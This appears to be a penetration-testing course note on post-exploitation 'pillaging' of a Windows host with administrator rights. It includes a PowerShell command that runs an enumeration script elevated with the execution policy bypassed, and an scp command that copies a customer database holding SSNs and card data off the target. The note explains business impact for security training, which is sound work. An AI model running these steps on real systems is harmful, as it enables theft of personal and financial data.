# 18 - Windows Pillaging


## 1. The Goal of Pillaging

Pillaging is post-exploitation enumeration performed with **the highest level of privileges**. With administrative access, we can bypass all previous permission restrictions and read any file on the system.

*   **Core Idea:** The focus shifts from finding a way to escalate privileges to finding the "crown jewels"â€”the data that the organization considers most valuable or sensitive.
*   **Methodology:** Similar to our initial enumeration, we can use automated scripts to speed up the process. Running a script like `WinPEAS` or a custom pillaging script as an administrator will yield a much more comprehensive and detailed report than when it was run as a standard user.

---

## 2. The Pillaging Workflow

### Step 1: Execute an Enumeration Script with Elevated Privileges
We transfer an automated script (like `winpill.ps1`) to the target and execute it with our newly acquired administrator rights.

*   **Command (to run a script as Administrator):**
    ```powershell
    Start-Process powershell.exe -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File C:\path\to\winpill.ps1"
    ```

### Step 2: Analyze the Privileged Output
The script's output, now run as an administrator, will contain a wealth of new information. We must carefully analyze this output to identify high-value files.

*   **Key Finding:** The script identifies a list of "interesting files" sorted by their last modification time. A file named **`customer_database.csv`** located in the Administrator's Documents folder immediately stands out.

### Step 3: Exfiltrate and Analyze the Sensitive Data
We use our established access to transfer the discovered file from the target machine back to our attacker machine for analysis.

*   **Transfer Command (`scp`):**
    ```shell
    scp john@10.129.12.20:C:/Users/Administrator/customer_database.csv .
    ```
*   **Analysis of `customer_database.csv`:**
    *   The file is a spreadsheet containing a large volume of highly sensitive customer data.
    *   **Critical Finding:** The file contains **Personally Identifiable Information (PII)**.

---

## 3. The Impact: Personally Identifiable Information (PII)

**PII** is any data that can be used to identify a specific individual. The exfiltrated file contains multiple types of PII, making this a critical data breach.

### Types of PII Discovered:
*   **Personal Identification:** Full Names, Social Security Numbers (SSNs), Dates of Birth.
*   **Contact Information:** Email addresses, Phone Numbers, Physical Addresses.
*   **Financial Data:** **Credit Card Numbers**, Expiry Dates, and **CVVs**.

### Business and Legal Consequences
Discovering and exfiltrating this type of data in a penetration test demonstrates the most severe level of business impact.
*   **Regulatory Fines:** A real-world breach of this nature would result in massive fines under data protection regulations like:
    *   **GDPR** (General Data Protection Regulation) in Europe.
    *   **CCPA** (California Consumer Privacy Act) in the US.
    *   **HIPAA** (Health Insurance Portability and Accountability Act) for healthcare data.
*   **Reputational Damage:** The loss of customer trust following such a breach can be catastrophic for a business.
*   **Financial Loss:** In addition to fines, the company would face costs from incident response, customer notification, and potential lawsuits.

---

## 4. Summary of the Pillaging Phase

*   After gaining administrator access, we re-ran an enumeration script to perform a deep scan of the system.
*   The scan immediately identified a high-value file, `customer_database.csv`, in the Administrator's user profile.
*   We successfully exfiltrated the file and confirmed it contained highly sensitive and regulated PII, including credit card numbers and SSNs.
*   This finding represents the successful completion of the primary objective of the penetration test, as it demonstrates a critical risk with severe financial and reputational consequences for the organization.
